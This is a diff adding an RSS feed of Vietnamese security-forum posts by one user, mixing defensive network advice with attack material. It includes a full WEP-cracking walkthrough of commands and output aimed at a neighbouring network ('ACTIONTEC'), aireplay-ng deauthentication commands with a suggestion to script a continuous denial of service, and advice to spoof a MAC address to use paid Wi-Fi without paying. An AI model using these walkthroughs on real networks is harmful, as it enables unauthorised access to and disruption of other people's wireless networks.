@@ -1,0 +1,559 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Messages posted by "nhuhoang"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/listByUser/144256.hva</link>
+		<description><![CDATA[Messages posted by "nhuhoang"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>nhờ các cao thủ giúp đỡ về việc mất pass modem</title>
+				<description><![CDATA[ Việc tìm ra người lấy pass chỉ là phản ứng kiểu "mất bò mới lo làm chuồng", mà nếu tìm ra thì bạn cũng chỉ nhắc nhở chứ không làm gì được
+
+Vậy thì giải pháp tốt nhất là ngăn chặn những hành động này, mình thấy có 1 số cách như sau:
+
+1. Tắt giao thức quản trị modem qua HTTP, chỉ dùng HTTPS. Khi đó toàn bộ dữ liệu lẫn pass đều bị mã hoá nên không lộ khi bị sniff, tuy vẫn có cách để decrypt nhưng rất mất công
+
+2. Cấu hình modem để chỉ có 1 IP nhất định được vào modem, ở đây là máy của bạn. 
+
+Vì mạng của bạn là mạng phẳng (flat) nên vẫn có thể attacker biết được IP của bạn để fake IP, tốt nhất là tạo 1 vlan quản trị riêng trên draytek, chia vlan trên swich và cấu hình chỉ cho IP trong vlan đấy được quản trị, như vậy sẽ triệt tiêu hoàn toàn cả 2 nguy cơ sniff password và fake IP]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/44867/276968.hva#276968</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/44867/276968.hva#276968</link>
+				<pubDate><![CDATA[Fri, 28 Jun 2013 03:30:49]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Chống UDP Flood Attack</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">mylove14129 wrote:</cite><br>
+		<blockquote>Theo nhận định của mình thì có thể sv của bạn bị UDP flood vào port 3389( do bạn mở remote desktop)
+<p></p>
+		<cite class="blockquote">nhuhoang wrote:</cite><br>
+		<blockquote>
+Giải pháp tốt nhất và có lẽ duy nhất là liên hệ với data center, đề nghị họ chặn toàn bộ gói tin UDP gửi đến địa chỉ server của bạn ấy, ngay tại router biên của data 
+&nbsp;
+		</blockquote>
+Giải pháp này khó mà thực hiện được, do trên sv của bạn 1412luv còn chạy một vài dịch vụ khác cần UDP( ex: game sv). Giải pháp của mình:
+1. Không dùng remote desktop( cách này tốt nhất vì port 3389 thường xuyên bị tấn công, cả bruteforce)
+2. Nếu vẫn dùng remote desktop.
+ Mở cửa sổ cmd dưới quyền administrator gõ thêm command sau( Win server 2008):
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>netsh advfirewall firewall add rule name="block_udp_3389" protocol=UDP localport = 3389 action=block dir=in</pre>
+		</div>&nbsp;
+		</blockquote>
+
+1. RDP cho win2k8 chỉ dùng TCP3389 chứ không dùng UDP3389 
+2. add thêm firewall rule vào windows trong trường hợp này cũng không có tác dụng gì bởi vì gói tin UDP đi đến server mới bị drop, trong lúc đấy thì network bandwidth đã full 100% rồi thì người dùng bt cũng không thể vào được. Đây là đòn hy sinh khi attacker có bandwidth bằng hoặc lớn hơn của victim
+
+Theo như mình quan sát trên hình thì server có IP 168.63.237.176 chính là nguồn gốc của cuộc tấn công, có location tại singapore, vậy thì mình đoán máy chủ của bạn 1412luv cũng không phải ở VN thì mới bị flush như vậy. Kiểu tấn công này nếu được thực hiện từ 1 số IP nhất định thì bạn chỉ cần thu thập các evidence rồi gửi cho DC bảo họ block đi là xong
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/44792/276967.hva#276967</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/44792/276967.hva#276967</link>
+				<pubDate><![CDATA[Fri, 28 Jun 2013 03:29:28]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Chống UDP Flood Attack</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">PXMMRF wrote:</cite><br>
+		<blockquote>
+ Ngoài ra bạn 1412luv  đã xoá IP tĩnh mà webserver của mình đang dùng trên WireShark cache, mà lại quên xoá hostname (hay computer name): ms-wxx-server.  Hì hì.
+ &nbsp;
+		</blockquote>
+
+Cái ms-wxx-server đấy là dst port đấy chứ, IP dst thì bạn ấy đã xoá hết rồi
+
+Với kiểu tấn công này thì attacker làm flush network lên 100% nên nếu chặn ở server mình cũng không có nhiều tác dụng. Các router trung gian vẫn cho gói tin UDP đi qua và làm ngập đường truyền. 
+
+Giải pháp tốt nhất và có lẽ duy nhất là liên hệ với data center, đề nghị họ chặn toàn bộ gói tin UDP gửi đến địa chỉ server của bạn ấy, ngay tại router biên của data center]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/44792/276951.hva#276951</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/44792/276951.hva#276951</link>
+				<pubDate><![CDATA[Thu, 27 Jun 2013 01:39:34]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Đề nghị HVA quan tâm hơn đến mảng bảo mật cho thiết bị di động</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote>Đề nghị này đã từng được đưa ra nhưng chưa thực hiện vì chưa thấy rõ nhu cầu. Nếu nhu cầu "mobile computing" thật sự đã cần thì có lẽ sẽ có một box "Mobile Computing" chứa hết tất cả mọi thứ về mobile device, kể cả jail break, bugs, bảo mật, thâm nhập cho mọi hệ điều hành. Nếu có nhu cầu tách rời từng loại ra thì tách sau.&nbsp;
+		</blockquote>
+
+Phải suy nghĩ theo cách của Apple chứ anh, tạo ra xu hướng cho thị trường là chìa khoá dẫn đến thành công  :P  Trong khi cái này trên thế giới đã rất phát triển rồi, VN mình đã có gì đâu, chẳng qua nổi tiếng chỉ vì mấy bài hand on như đợt New iPad thôi
+
+Lúc đầu mới tạo em nghĩ sẽ có ít người tham gia, bởi vì hiện tại HVA phần nhiều quan tâm đến máy tính hơn, những người muốn nghiên cứu phát triển thì họ lại muốn sang tinhte hay gsm vì bên đấy có nhiều người để thảo luận, khen ngợi họ. Nên ngoài việc tạo ra sân chơi thì còn phải có 1 số lượng nhất định bài có giá trị trên diễn đàn, sau đấy làm cho mọi người biết đến thì mới có thể thu hút được. Vì vậy như anh tranvanminh nói thì phải có 1 dev team dịch/viết bài cho box nữa
+
+Em thì chỉ nêu ý tưởng thôi chứ hiện tại em không đủ thời gian để theo đam mê này, xin dành lại đất diễn cho các bạn trẻ :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/42210/262846.hva#262846</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/42210/262846.hva#262846</link>
+				<pubDate><![CDATA[Wed, 9 May 2012 12:13:22]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Đề nghị HVA quan tâm hơn đến mảng bảo mật cho thiết bị di động</title>
+				<description><![CDATA[ Hiện tại em thấy các chủ đề về bảo mật cho thiết bị di động đang nóng trên thế giới, nhưng ở VN vẫn chưa thực sự có một diễn đàn nào chuyên về phần này để anh em trao đổi, nâng cao kiến thức nên VN ta ngày càng tụt hậu so với thế giới. Các os cho máy tính ngày càng nhận được ít sự quan tâm hơn so với os cho mobile, tablet, nếu HVA không thay đổi thì không thể lớn mạnh được, thực tế thì lâu nay em vẫn vào những 4rum như tinhte.vn nhiều hơn là vào HVA. Nên em đề nghị BQT xem xét thêm mục thảo luận các vấn đề bảo mật cho thiết bị di động, về diễn đàn con thì theo em có thể chia ra theo OS:
+<ul><li>Android
+IOS
+Windows Phone
+Khác</li></ul>
+hoặc chia theo chuyên mục:
+<ul><li>Virus, trojan
+bảo mật
+thâm nhập
+bug+jailbreak</li></ul>
+Ngoài ra nếu có điều kiện thì HVA nên phát triển phiên bản web dành cho di động nữa hoặc kết hợp với tapatalk để vào qua mobile/tablet không cần browser
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/42210/262767.hva#262767</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/42210/262767.hva#262767</link>
+				<pubDate><![CDATA[Tue, 8 May 2012 22:57:14]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Cần giúp đỡ kiến thức về hệ thống an ninh mạng cho công ty</title>
+				<description><![CDATA[ Chi phí tối ưu nhưng đừng quá tiết kiệm
+
+An ninh cho một hệ thống mạng được tổ hợp từ rất nhiều thành phần, chia tách những thành phần đấy ra thì mới có thể tìm được giải pháp tối ưu, không phải lúc nào open source cũng là cách tốt. Khi bạn đưa ra câu hỏi này thì mình nghĩ bạn mới chỉ bắt tay vào làm security, và việc áp dụng một mớ open source ngay sẽ dễ làm bạn "ngộp" trong sự rắc rối mà nó đem lại
+
+Mình không biết quy mô cty mà bạn xin vào như thế nào nên mình chỉ đưa ra một mô hình cho hệ thống mạng có từ 200-300 người và vài máy chủ
+
+<font color='yellow'>Firewall
+</font>Sử dụng appliance firewall, đừng tiết kiệm mà sử dụng software. Firewall trung tâm đóng vai trò rất quan trọng trong hệ thống, và nên sử dụng 1 cặp để dự phòng và share tải. Đối với hệ thống nhỏ và vừa thì có thể sử dụng các giải pháp của Juniper, Fortinet, hệ thống lớn hơn và nhiều tiền hơn thì dùng Checkpoint
+
+<font color='yellow'>Proxy
+</font>Windows server + ISA (bản "miễn phí") là sự lựa chọn không tồi nếu bạn chưa biết gì về linux, còn nếu rành rồi thì có thể dùng linux + squid. Còn nếu thừa rất nhiều tiền thì có thể dùng Bluecoat
+
+<font color='yellow'>IDS/IPS</font>
+Một hệ thống nhỏ và vừa thì có thể dùng tính năng tích hợp sẵn trong các firewall dòng UTM. Các firewall UTM này thậm chí còn có thêm cả các tính năng về url filtering, Anti-virus,... nhưng nhiều khi phải mua thêm license
+
+<font color='yellow'>VPN
+</font>Linux+OpenVPN là 1 giải pháp hay, không thì Windows Server (bản "miễn phí") cũng được
+
+<font color='yellow'>Application firewall</font>
+Thường thì với 1 hệ thống lớn người ta sẽ dùng các giải pháp về phần cứng bảo vệ cho toàn bộ website trong mạng, nhưng để tiết kiệm chi phí thì ta có thể sử dụng các giải pháp software như mod_security cài ngay trên web server.
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/38965/240858.hva#240858</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/38965/240858.hva#240858</link>
+				<pubDate><![CDATA[Tue, 14 Jun 2011 23:25:58]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Cách dò khóa WEP khi không có client nào kết nối đến access point</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">nhanth87 wrote:</cite><br>
+		<blockquote>Các AP đời sau này filmware của tụi nó đều được Harderning để chống fake authentication hoặc inject gói tin hết rồi nên cách naỳ nhiều khi không dùng được.&nbsp;
+		</blockquote>
+
+Chống injection bằng cách giới hạn packet/s thì còn được chứ fake authen thì chịu thôi bạn à. Có một trường hợp mà nhiều bạn nhầm lẫn là router được filter MAC thì các bạn không thể fake authen được mà vẫn phải dò cho đến khi có client kết nối vào rồi dùng macchanger, chứ không phải router có tính năng chống fake authen (chống thì loại luôn cả ng dùng hợp pháp rồi còn gì)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/33732/207683.hva#207683</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/33732/207683.hva#207683</link>
+				<pubDate><![CDATA[Wed, 24 Mar 2010 08:51:04]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>HN tuyển chuyên viên,trưởng nhóm bảo mật-làm việc tại Ngân hàng TMCP</title>
+				<description><![CDATA[ Vị trí khá hấp dẫn đấy chứ, có điều mình đang làm về network security chứ không phải system security :)]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/33183/207398.hva#207398</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/33183/207398.hva#207398</link>
+				<pubDate><![CDATA[Fri, 19 Mar 2010 22:26:05]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Ko kết nối đc với wifi (wifi ko có pass)</title>
+				<description><![CDATA[ Khả năng cao là nó lọc MAC, khi nào bạn xì tiền ra thì nó mới add thêm MAC của bạn vào. Muốn truy cập thì dễ thôi, dùng airdump-ng để dò xem thằng nào đang kết nối, sau đó search tool có thể thay đổi MAC của card wireless thành MAC của thằng đang kết nối kia là xong]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/33603/207382.hva#207382</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/33603/207382.hva#207382</link>
+				<pubDate><![CDATA[Fri, 19 Mar 2010 11:11:22]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Cách dò khóa WEP khi không có client nào kết nối đến access point</title>
+				<description><![CDATA[ Giờ mà viết bài crack wep thì nghe có vẻ lỗi thời nhỉ, dùng công nghệ của năm 2010 để bẻ khóa công nghệ của những năm 2000. Nhưng thực tế thì có đến 30-40% số mạng không dây hiện tại vẫn dùng phương pháp mã hóa yếu ớt này. Do vậy đề tài dò khóa wep luôn là một đề tài được nhiều người quan tâm
+
+Thông thường crack wep khá dễ, nhưng đó là đối với các mạng đang có client kết nối. Khi client dùng mạng thì thi thoảng sẽ tạo ra những gói ARP request và ta sẽ bắt gói tin này, bơm liên tục vào access point khiến cho access point phải “nhả” key ra cho ta dùng. Tuy nhiên đối với mạng không có client thì sao, sẽ không có ARP request để mà bơm, do vậy ta phải tự “tạo” ra một gói ARP làm sao cho access point tưởng đó là thật mà nhả key ra
+Bài này sử dụng file iso Backtrack 4.0 final và usb wifi TP-Link WN321G, cả 2 đều được mount vào máy ảo VMware để có thể vừa dò vừa viết log
+Sau khi quét phát hiện thấy mạng ACTIONTEC sóng khá tốt nhưng ko hề có data, tức ko có client nào kết nối
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#91;CH  7 &#93;&#91; Elapsed: 3 mins &#93;&#91; 2010-01-22 22:41
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 00:1E:E5:98:41:BE  -73      111      223    0  11  54 . WEP  WEP    OPN  delta
+ 00:0F:B3:3A:76:35  -76       36        0    0   9  54 . WEP  WEP         ACTIONTEC
+ 00:B0:0C:3E:12:3B  -82       72        0    0   6  54   OPN              TENDA
+ 00:B0:0C:05:1A:0A  -83       11        0    0   6  54   WPA2 CCMP   PSK  PhanBro
+
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes
+
+ 00:1E:E5:98:41:BE  00:1D:0F:DF:E3:00    0    0 - 1      0      114
+ 00:1E:E5:98:41:BE  00:12:F0:CA:2B:BE   -1    1 - 0      0      359
+ &#40;not associated&#41;   00:1F:E1:9C:98:17  -79    0 - 1      0       19  ZyXEL
+ &#40;not associated&#41;   00:21:00:B7:DE:02  -81    0 - 1      0       19  vietdat
+ &#40;not associated&#41;   00:16:EA:C6:16:62  -37    0 - 1      0       17</pre>
+		</div>
+Đầu tiên, sniff mạng ACTIONTEC vào file
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>airodump-ng wlan0 -c 9 --bssid 00:0F:B3:3A:76:35 -w actiontec
+
+CH  9 &#93;&#91; Elapsed: 19 mins &#93;&#91; 2010-01-22 23:02
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 00:0F:B3:3A:76:35  -81   0     4015        0    0   9  54 . WEP  WEP    OPN  ACTIONTEC
+
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes</pre>
+		</div>
+Giả mạo làm một người dùng hợp pháp bằng tính năng fake authentication của aireplay-ng
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>aireplay-ng -1 10 -a 00:0F:B3:3A:76:35 wlan0 
+
+root@bt:~# aireplay-ng -1 10 -a 00:0F:B3:3A:76:35 wlan0
+No source MAC &#40;-h&#41; specified. Using the device MAC &#40;00:1D:0F:DF:E3:00&#41;
+22:43:11  Waiting for beacon frame &#40;BSSID: 00:0F:B3:3A:76:35&#41; on channel 9
+
+22:43:11  Sending Authentication Request &#40;Open System&#41; &#91;ACK&#93;
+22:43:11  Authentication successful
+22:43:11  Sending Association Request &#91;ACK&#93;
+22:43:11  Association successful :-&#41; &#40;AID: 1&#41;
+22:43:21  Sending Authentication Request &#40;Open System&#41;</pre>
+		</div>Rình rập một chú “cừu non” đi lạc. Nguyên lý của cách tấn công này là tóm lấy 1 packet phù hợp từ accesspoint, sử dụng các thông số có trong packet này để tạo ra arp request. Tùy vào sự may mắn, bạn có thể phải chờ chương trình read vài ngàn gói tin mới có thể tìm được một gói tin ưng ý, gói tin này có chứa keystream.
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>root@bt:~# aireplay-ng -5 -b 00:0F:B3:3A:76:35 wlan0
+No source MAC &#40;-h&#41; specified. Using the device MAC &#40;00:1D:0F:DF:E3:00&#41;
+22:44:26  Waiting for beacon frame &#40;BSSID: 00:0F:B3:3A:76:35&#41; on channel 9
+22:44:26  Waiting for a data packet...
+Read 2233 packets...
+
+        size: 386, FromDS: 1, ToDS: 0 &#40;WEP&#41;
+
+              BSSID  =  00:0F:B3:3A:76:35
+          Dest. MAC  =  01:00:5E:7F:FF:FA
+         Source MAC  =  00:0F:B3:3A:76:32
+
+        0x0000:  0842 0000 0100 5e7f fffa 000f b33a 7635  
+        0x0010:  000f b33a 7632 403f aa16 ea00 41a3 9c9c  
+        0x0020:  fc66 2e21 4713 6d55 be7b b622 a5c8 47f1
+        0x0030:  be1f 4cd4 c488 5d6c a4de 07e4 d815 88f4  
+        0x0040:  75ae cce8 2092 854a 8101 73d4 77f4 2e80
+        0x0050:  1321 0747 5aaa 8025 04a2 c65e a237 794e 
+        0x0060:  556c f897 2f02 dab6 6a13 5967 c6a2 548e 
+        0x0070:  ca0d bb21 326f 2abe 8afa aae5 9212 2ca9 
+        0x0080:  1046 0084 0319 2b46 e651 6497 0c72 d1b1
+        0x0090:  2335 ffc8 111c 152e 2b49 e222 a204 06ea 
+        0x00a0:  5594 19b3 cebf 0eaf b295 d9de 6768 595a 
+        0x00b0:  0eb5 f86f 4349 5d75 b650 34a2 61ed 2c42 
+        0x00c0:  ce30 f519 bc72 57af 8367 bce6 d87f 3fd6 
+        0x00d0:  7c42 fd6a 8dff 9384 a5df dfa0 292e 194a 
+        --- CUT ---
+
+Use this packet ? y
+
+Saving chosen packet in replay_src-0122-224956.cap
+22:50:00  Data packet found!
+22:50:00  Sending fragmented packet
+22:50:00  Got RELAYED packet!!
+22:50:00  Trying to get 384 bytes of a keystream
+22:50:00  Not enough acks, repeating...
+22:50:00  Trying to get 384 bytes of a keystream
+22:50:00  Got RELAYED packet!!
+22:50:00  Trying to get 1500 bytes of a keystream
+22:50:00  Got RELAYED packet!!
+Saving keystream in fragment-0122-225000.xor
+Now you can build a packet with packetforge-ng out of that 1500 bytes keystream</pre>
+		</div>
+Dùng packetforce-ng để chế biến ra một arp request hoàn toàn hợp lệ, giống như chú blackberry của mấy anh Hồ Cẩm Đào vậy
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>root@bt:~# packetforge-ng -0 -a 00:0F:B3:3A:76:35 -h 00:1D:0F:DF:E3:00 -k 255.255.255.255 -l 255.255.255.255 -y fragment-0122-225000.xor -w arp-req
+
+Wrote packet to: arp-req</pre>
+		</div>
+Có đạn rồi thì cứ lắp vào súng máy mà bắn thôi
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>root@bt:~# aireplay-ng -2 -r arp-req wlan0
+No source MAC &#40;-h&#41; specified. Using the device MAC &#40;00:1D:0F:DF:E3:00&#41;
+
+        size: 68, FromDS: 0, ToDS: 1 &#40;WEP&#41;
+
+              BSSID  =  00:0F:B3:3A:76:35
+          Dest. MAC  =  FF:FF:FF:FF:FF:FF
+         Source MAC  =  00:1D:0F:DF:E3:00
+
+        0x0000:  0841 0201 000f b33a 7635 001d 0fdf e300 
+        0x0010:  ffff ffff ffff 8001 06cc 8500 fdf0 b56b  
+        0x0020:  aa0c d118 7897 55e7 c4c6 8806 6fca 10d9 
+        0x0030:  2976 ea99 b1eb 35d6 097b 4702 72ec 4829 
+        0x0040:  c854 6e25                               
+
+Use this packet ? y
+
+Saving chosen packet in replay_src-0122-230028.cap
+You should also start airodump-ng to capture replies.
+
+Send 4580 packets…&#40;499pps&#41;</pre>
+		</div>
+Quay lại airodump-ng xem lượng data tăng vùn vụt
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>&#91; CH  9 &#93;&#91; Elapsed: 19 mins &#93;&#91; 2010-01-22 23:02
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ 00:0F:B3:3A:76:35  -81   0     4015    25972  442   9  54 . WEP  WEP    OPN  ACTIONTEC
+
+ BSSID              STATION            PWR   Rate    Lost  Packets  Probes
+
+ 00:0F:B3:3A:76:35  00:1D:0F:DF:E3:00    0    0 - 1      1    59304</pre>
+		</div>
+Với tốc độ 500pps thì chỉ cần 30s để phá wep 64 bit, còn wep 128 bit thì lâu hơn 20 lần, khoảng 10 phút
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>root@bt:~# aircrack-ng -a 1 actiontec-01.cap
+Opening actiontec-01.cap
+Read 53122 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  00:0F:B3:3A:76:35  ACTIONTEC                 WEP &#40;12538 IVs&#41;
+
+Choosing first network as target.
+
+Opening actiontec-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 12633 ivs.
+
+                                          Aircrack-ng 1.0 rc3 r1552
+
+                          &#91;00:01:33&#93; Tested 775 keys &#40;got 41314 IVs&#41;
+
+   KB    depth   byte&#40;vote&#41;
+    0    1/  2   5E&#40;52736&#41; 95&#40;49152&#41; 49&#40;48896&#41; 46&#40;48640&#41; 65&#40;48384&#41; 67&#40;48384&#41; 99&#40;48128&#41;
+    1   16/  1   B6&#40;46336&#41; C3&#40;45824&#41; 73&#40;45568&#41; C5&#40;45568&#41; DF&#40;45568&#41; 04&#40;45056&#41; 2A&#40;45056&#41;
+    2    0/  3   33&#40;57856&#41; C2&#40;50944&#41; 4B&#40;49920&#41; 7E&#40;49408&#41; 0C&#40;48896&#41; 76&#40;48128&#41; 4F&#40;47616&#41;
+    3    0/  6   44&#40;56064&#41; F3&#40;51712&#41; 24&#40;49920&#41; 31&#40;48640&#41; 57&#40;48640&#41; 2F&#40;48384&#41; 19&#40;48128&#41;
+    4   41/  4   B6&#40;44800&#41; 03&#40;44544&#41; 4A&#40;44544&#41; 6A&#40;44544&#41; 91&#40;44544&#41; A3&#40;44544&#41; CD&#40;44544&#41;
+
+             KEY FOUND! &#91; 11:11:11:11:11:11:11:11:11:11:11:11:11 &#93;
+        Decrypted correctly: 100%</pre>
+		</div>
+
+Ngoài ra còn một số cách nữa nhưng với bài viết này bạn có thể dò được đến 99% mạng wireless dùng WEP xung quanh, trừ những mạng xác thực bằng RADIUS (mà thực tế rất ít).]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/33732/207381.hva#207381</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/33732/207381.hva#207381</link>
+				<pubDate><![CDATA[Fri, 19 Mar 2010 10:48:35]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: Ai giúp mình tìm phần mềm dò pass của wireless</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">pigeroes wrote:</cite><br>
+		<blockquote>Có nhiều phương pháp tùy theo loại card wifi của bạn, card chip càng xịn thì càng có nhiều khả năng crack.&nbsp;
+		</blockquote>
+
+Bạn nhầm to, xịn hay không tùy vào các công nghệ mà nó tích hợp, còn khả năng crack lại phụ thuộc vào loại chipset mà nó sử dụng. Một cái card atheros hiệu TP-Link chỉ khoảng 18$, tha hồ vọc.
+
+WPA crack hên xui, hên thì mất 1 phút còn xui thì never]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/2083/162086.hva#162086</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/2083/162086.hva#162086</link>
+				<pubDate><![CDATA[Thu, 11 Dec 2008 21:49:17]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: Mấy anh kiểm tra giúp trang web này nó dùng shell gì </title>
+				<description><![CDATA[ Không có script thì làm ăn được gì. Chỉ có mỗi dòng text 
+<blockquote>Eror! Lang file is absent!&nbsp;
+		</blockquote>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/26010/157883.hva#157883</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/26010/157883.hva#157883</link>
+				<pubDate><![CDATA[Thu, 6 Nov 2008 03:34:33]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: Dùng PQ Magic phân lại ổ, mất điện, dữ liệu bị mã hóa hết</title>
+				<description><![CDATA[ Một số phần mềm phục hồi dữ liệu mà bạn có thể dùng thử:
+
+Ontrack Data Recovery
+PC Inspector File Recovery
+
+Trong Hiren boot hình như cũng có Ontrack
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/26029/157881.hva#157881</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/26029/157881.hva#157881</link>
+				<pubDate><![CDATA[Thu, 6 Nov 2008 03:26:55]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>cơ chế của việc tấn công DOS trong mạng wireless</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">kenshin8x wrote:</cite><br>
+		<blockquote>theo em hiểu cơ chế DOS trong mạng wireless là attacker sẽ gửi các gói tin giả dạng gói tin của AP đến các station kết nối vào AP làm cho station bị mất kết nối đến AP. (không biết có đúng không? :-S) bác nào biết về cái này giải thích hộ cái  ;-) &nbsp;
+		</blockquote>
+
+Rất đơn giản. Bạn dùng gửi gói tin DeAthentication dạng broadcast hoặc unicast có bssid là MAC của Access Point (AP) thì các máy trạm (station) đang kết nối đến AP đó sẽ dính chưởng ngay bởi vì station không hề hỏi lại xem có đúng AP gửi không. Quá trình DeAuth là "không thể từ chối".
+
+Có thể tấn công dạng này bằng cách dùng aireplay-ng:
+
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#aireplay-ng -0 1 -a &lt;AP's MAC&gt; ath0
+Hoặc
+#aireplay-ng -0 1 -a &lt;AP's MAC&gt; -c &lt;station's MAC&gt; ath0</pre>
+		</div>
+
+Nếu viết một script định kì 10s gửi gói tin DeAuth thì không một station nào có thể kết nối với AP. Mục đích Deny Of Services đã thành công]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/25994/157880.hva#157880</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/25994/157880.hva#157880</link>
+				<pubDate><![CDATA[Thu, 6 Nov 2008 03:21:44]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: về việc thâm nhập mạng wifi với chip intell 3945 abg</title>
+				<description><![CDATA[ Trên thị trường có loại cardbus TP-Link WN510G cắm khe PCMCIA của laptop dùng chipset atheros AR5005 chỉ có 19-20$. Mình đã dùng thử loại này và thấy đĩa backtrack hỗ trợ rất tốt, thực hiện được tất cả các loại attack. Bạn nào có ý định mày mò thì có thể tham khảo loại này]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/14553/157877.hva#157877</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/14553/157877.hva#157877</link>
+				<pubDate><![CDATA[Thu, 6 Nov 2008 02:52:55]]> GMT</pubDate>
+				<author><![CDATA[ nhuhoang]]></author>
+			</item>
+			<item>
+				<title>Re: về việc thâm nhập mạng wifi với chip intell 3945 abg</title>
+				<description><![CDATA[ Đối với một số card mạng của intel thì thậm chí backtrack còn không nhận ra. Vì vậy nếu muốn tìm dò pass của mạng wifi thì tốt nhất nên tìm một card mạng nào đó có chipset atheros, broadcom, prism,...
+
+Đối với máy bàn thì bạn nên sử dụng card PCI, loại này hỗ trợ Injection/Fragmentation Attack tốt hơn nhiều so với loại USB. Tương tự đối với laptop, dùng card PCMCIA hoặc các card mở rộng khác cũng tốt hơn nhiều sơ với loại USB.
+
+Nếu bạn không có nhiều điều kiện về kinh tế, có thể dùng loại USB WN321G/WN322G của TP-Link, loại này bán trên thị trường với giá rất rẻ từ 15-20$ và sử dụng chipset rt73 được hỗ trợ khá tốt trong aircrack-ng và đĩa backtrack
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/preList/14553/154005.hva#154005</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/preList/14553/154005.hva#154005</link>
